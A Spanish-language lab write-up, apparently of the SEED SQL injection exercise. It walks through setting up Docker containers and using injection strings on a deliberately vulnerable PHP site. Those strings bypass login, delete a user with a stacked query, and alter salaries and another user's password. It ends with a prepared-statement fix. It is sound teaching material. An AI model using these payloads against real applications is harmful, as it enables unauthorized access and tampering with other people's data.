## Preparación.
Descargamos el `Labsetup.zip` y lo descomprimimos.

Abrimos una terminal y ejecutamos el siguiente comando:
````bash
sudo nano /etc/hosts
````

![[Pasted image 20250501223932.png]]

Esto abrirá el archivo `/etc/hosts`en el editor *nano*.

Ahora tenemos que escribir el siguiente código:

![[Pasted image 20250501224027.png]]

Presionamos `Ctrl + O` para guardar los cambios y luego `Enter` para confirmar y finalmente `Ctrl + X` para salir del editor.

Ahora navegamos a la carpeta `image_www` y abrimos el archivo `apache_sql_injection.conf` y editamos el parámetro `DocumentRoot` poniendo la ruta absoluta del directorio `Code` donde se encuentra el proyecto *PHP*. 

![[Pasted image 20250501230132.png]]

Guardamos y cerramos.

Luego abrimos una nueva pestaña de la terminal en la carpeta `Labsetup` y ejecutamos el comando:
````bash
sudo rm -rf mysql_data
````

![[Pasted image 20250501213127.png]]

Esto elimina de manera forzada y recursiva el directorio llamado `mysql_data` y todo su contenido.

Posteriormente ejecutamos el comando:
````bash
dcdown
````

![[Pasted image 20250501213242.png]]

Con este comando detenemos y eliminamos los servidores locales activos, contenedores, redes y volúmenes en el archivo `docker-compose.yml` de *Docker*.

Ahora ejecutamos el comando:
````bash
dcbuild
````

![[Pasted image 20250501213354.png]]

Esto  construye las imágenes de los servicios definidos en `docker-compose.yml`.

Después ejecutamos el comando
````bash
dcup
````

![[Pasted image 20250501214738.png]]

Para inicializar los contenedores.

Ahora abrimos una nueva pestaña en la terminal y ejecutamos:
````bash
dockps
````

![[Pasted image 20250501215015.png]]

Esto muestra los contenedores en ejecución en *Docker*.
## Tareas del Laboratorio.

### Tarea 1: Conociendo las Declaraciones SQL.
Dentro de la misma pestaña donde ejecutamos `dockps` ejecutamos el comando:
````bash
docksh #id_mysql
````

![[Pasted image 20250501215806.png]]

Esto nos permite acceder a la *shell* del contenedor de `my_sql`.

Una vez que hayamos accedido a la *shell* ejecutamos el siguiente comando:
````shell
mysql -u root -pdees
````

![[Pasted image 20250501215953.png]]

Este comando inicia la línea de comandos de *MySQL* con el usuario `root` y la contraseña `dees`.

Ya que tengamos acceso a la terminal de *MySQL* podemos visualizar las bases de datos con el comando:
````mysql
show databases;
````

![[Pasted image 20250501220409.png]]

Ahora cargamos la base de datos llamada `sqllab_users` que ya ha sido creada con el comando:
````mysql
use sqllab_users;
````

![[Pasted image 20250501220617.png]]

Para mostrar las tablas la base de datos usamos el comando:
````mysql
show tables;
````

![[Pasted image 20250501220845.png]]

Otra cosa que podemos hacer es observar la estructura de la tabla `credential`:
````mysql
describe credential;
````

![[Pasted image 20250501221012.png]]

También podemos obtener todos los registros (filas) de la tabla `credential` con el siguiente comando:
````mysql
select * from credential;
````

![[Pasted image 20250501231537.png]]

### Tarea 2: Inyección SQL en la Declaración SELECT.
Nos dirigimos a la carpeta 
````bash
cd Labsetup/image_www/Code
````

Y abrimos el archivo `unsafe_home.php` hasta encontrar el siguiente fragmento de código:

![[Pasted image 20250501221638.png]]

Este código ejecuta una consulta `SELECT` a la base de datos para recuperar ciertos datos de la tabla `credential`, basándose en los valores de `name` y `Password`.
Los datos que recupera son:
- `id`
- `name`
- `eid`
- `salary`
- `birth`
- `ssn`
- `phoneNumber`
- `address`
- `email`
- `nickname`
- `Password`

Abrimos un navegador y buscamos http:www.seed-server.com, esto abrirá el proyecto *PHP* y tendremos la siguiente vista:

![[Pasted image 20250501230531.png]]

#### Tarea 2.1: Ataque de Inyección SQL desde la página web.
Como ya vimos que existe un usuario llamado `Admin` y entendimos como funciona la consulta *SQL* podemos manipularla para obtener acceso no autorizado ingresando como *USERNAME* `Admin' #`. Esto ya que la consulta que se ejecuta en el código *PHP* es la siguiente:
````mysql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email, nickname, Password
FROM credential
WHERE name = '$input_uname' and Password = '$hashed_pwd';
````

Pero si introducimos `Admin' #` como el valor de  `input_name`, la consulta *SQL* que se genera será algo así:
````mysql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email, nickname, Password
FROM credential
WHERE name = 'Admin' # and Password = '$hashed_pwd';
````

1. `'Admin'`: EL nombre `Admin` es una cadena válida.
2. `#`: En *SQL*, el símbolo `#` es utilizado como comentario. Esto significa que todo lo que sigue al `#` es ignorado por el manejador de la base de datos.
Entonces la consulta completa se convierte en:
````mysql
SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email, nickname, Password
FROM credential
WHERE name = 'Admin';
````

Como resultado, la contraseña no se evalúa (porque está comentada) y la consulta busca solo al usuario `Admin` en la base de datos.

Así que ingresamos como *USERNAME* el valor de `Admin' #`:

![[Pasted image 20250501232256.png]]

Le damos a `LOGIN` y vemos que conseguimos el acceso:

![[Pasted image 20250501232325.png]]

#### Tarea 2.2: Ataque de Inyección SQL desde la consola.
Ahora tenemos que elaborar el mismo ataque pero desde la consola, así que regresamos a nuestra terminal y abrimos una nueva pestaña, en este caso vamos a obtener acceso al perfil de *Alice*.

Primero tenemos que codificar ciertos caracteres especiales para poder usarlos correctamente en la *URL*. Podemos encontrar las codificaciones con la página www.urlencoder.org Los caracteres que codificaremos son:
- `'`: Su codificación es `%27`.
- ` `: (Espacio) Su codificación es `%20`.
- `#`: Su codificación es `%23`.

Ya que hayamos encontrado las codificaciones de los caracteres ejecutamos el siguiente comando:
````bash
curl 'www.seed-server.com/unsafe_home.php?username=alice%27%20%23&Password=11'
````

Y vemos que tuvimos acceso a la información:

![[Pasted image 20250501233752.png]]

#### Tarea 2.3: Agregando una nueva declaración SQL.
Abrimos el archivo `unsafe_home.php` y en la parte de *create a connection*, específicamente en el siguiente fragmento de código:

![[Pasted image 20250502002708.png]]

lo editamos de modo que quedé `multi_query`:

![[Pasted image 20250502002816.png]]

Guardamos y salimos. Esto nos permitirá ejecutar varias sentencias `SQL`.

Ahora salimos de la consola de *MySQL* con el comando
````mysql
exit
````

![[Pasted image 20250502003010.png]]

Y también salimos de la *shell* del contenedor de *MySQL* con el mismo comando `exit`:

![[Pasted image 20250502003119.png]]

Ejecutamos el comando
````shell
dockps
````

para ver los contenedores que están en ejecución y accedemos a la *shell* del contenedor donde se ejecuta el proyecto *PHP* con el comando
````bash
docksh #id_php
````

![[Pasted image 20250502003358.png]]

Mostramos los directorios con `ls`:

![[Pasted image 20250502003436.png]]

Navegamos al directorio `var/www/` con el comando:
````bash
cd var/www/
````

Y nuevamente mostramos los ficheros con `ls`:

![[Pasted image 20250502003607.png]]

Ingresamos a la carpeta `SQL_Injection` y mostramos su contenido:

![[Pasted image 20250502003707.png]]

Ahora copiamos la ruta desde el `id` del contenedor (lo que sigue después del @).

Nos dirigimos al directorio `Labsetup` hasta el contenido de la carpeta `Code` y abrimos una nueva terminal para ejecutar el siguiente comando:
````bash
docker cp unsafe_home.php #ruta_copiada
````

![[Pasted image 20250502004042.png]]

Abrimos de nuevo nuestro navegador con la página de www.seed-server.com e ingresamos como usuario lo siguiente `Ted'; DELETE FROM qllab_users.credential WHERE Name = 'Ted'; #`

![[Pasted image 20250502004438.png]]

Con una consulta a la base de datos comprobamos que el usuario haya sido eliminado:

![[Pasted image 20250502005033.png]]

Finalmente eliminamos el cambio que realizamos en el archivo `unsafe_home.php` y volvemos a ejecutar el comando anterior:

![[Pasted image 20250502005424.png]]

### Tarea 3: Inyección SQL en la Declaración UPDATE.

#### Tarea 3.1: Modificar su propio salario.
Para este caso vamos a modificar el salario de Alice, así que iniciamos sesión con la anterior vulnerabilidad (ingresando como *USERNAME*: `Alice' #`)

![[Pasted image 20250502010035.png]]

Damos click en la opción *Edit Profile*:

![[Pasted image 20250502010054.png]]

Desde aquí no podemos modificar nuestro salario pero podemos usar la siguiente inyección `SQL` para cambiar nuestro salario `Alice',salary=999999; #` ingresando la en el campo del *Nickname*:

![[Pasted image 20250502010343.png]]

Damos click en *Save* y vemos como ha cambiado nuestro salario:

![[Pasted image 20250502010411.png]]

Pero vemos que al hacer esto modifica el salario de todos los usuarios en la base de datos:

![[Pasted image 20250502010720.png]]

#### Tarea 3.2: Modificar el salario de otras personas.
Iniciamos sesión en el perfil de Alice para cambiar el salario de Boby a $1 con la siguiente inyección `SQL`: `Alice',salary=1 where name='Boby'; #` ingresando la de la misma forma que la anterior:

![[Pasted image 20250502011040.png]]

Damos click en *Save* e ingresamos al perfil de Boby para ver si los cambios hicieron efecto:

![[Pasted image 20250502011113.png]]

#### Tarea 3.3: Modificar el password de otras personas.
Iniciamos sesión con el perfil de Alice y nos dirigimos a la página para editar nuestro perfil:

![[Pasted image 20250502011331.png]]

Volvemos a usar una inyección `SQL` la cual es: `Boby',password=sha1('bobytonto') where name='Boby'; #` 

![[Pasted image 20250502011713.png]]

Damos click en *Save* y cerramos sesión.

Procedemos a intentar iniciar sesión en el perfil de Boby con la contraseña `bobytonto`:

![[Pasted image 20250502011829.png]]

![[Pasted image 20250502011842.png]]

Efectivamente tuvimos éxito.

### Tarea 4: Contramedida - Declaraciones Preparadas.
Accedemos a www.seed-server.com/defense/ y podemos ver que se siguen presentando algunas vulnerabilidades como ingresar con `Alice' #`

![[Pasted image 20250502012307.png]]

Nuestro objetivo es cambiar la página para evitar esto.

En el mismo directorio `Code` encontraremos una carpeta llamada `defense`, procedemos a abrirla y abrir el archivo `unsafe_home.php` para editarlo.

En la sección *// do the query* vemos que tenemos el siguiente fragmento de código:

![[Pasted image 20250502012717.png]]

El cual tiene vulnerabilidades a inyecciones `SQL` debido a que:
- El valor de `$input_uname` (nombre de usuario) y `$hashed_pwd` (contraseña hasheada) se insertan directamente en la consulta `SQL`, pero además estos valores provienen de un formulario web en el cual un atacante podría manipular esos valores para inyectar código `SQL` malicioso.

En cambio si cambiamos ese fragmento de código por este:
````php
// Preparar la consulta SQL
$stmt = $conn->prepare(
	"SELECT id, name, eid, salary, ssn
	FROM credential
	WHERE name= ? and Password = ?"); // Placeholders ? para eliminar la inyección SQL
// Vincular los parámetros al query
$stmt->bind_param("ss", $input_uname, $hashed_pwd); //ss indica que los datos se manejaran como strings
$stmt->execute();
$stmt->bind_result($id, $name, $eid, $salary, $ssn);
$stmt->fetch();
$stmt->close();
````

![[Pasted image 20250502014047.png]]

Guardamos y cerramos y abrimos una terminal en el directorio `Code/defense` ejecutamos el siguiente comando:
````bash
docker cp unsafe.php 2e9eb027efe0:/var/www/SQL_Injection/defense
````

![[Pasted image 20250502014656.png]]

Volvemos a la página www.seed-server.com/defense/ y volvemos a probar la vulnerabilidad ingresando `Alice' #` en el *USERNAME*:

![[Pasted image 20250502014806.png]]

![[Pasted image 20250502014814.png]]

Vemos que no hemos obtenido ningún resultado, intentemos ingresando al perfil de Boby ya que es la contraseña que si conocemos:

![[Pasted image 20250502014917.png]]

![[Pasted image 20250502014930.png]]

![[Pasted image 20250502014938.png]]

Vemos que hemos podido acceder.

## Conclusiones.

Se ha explicado paso a paso como realizar cada tarea a detalle y se han podido cumplir con todas.
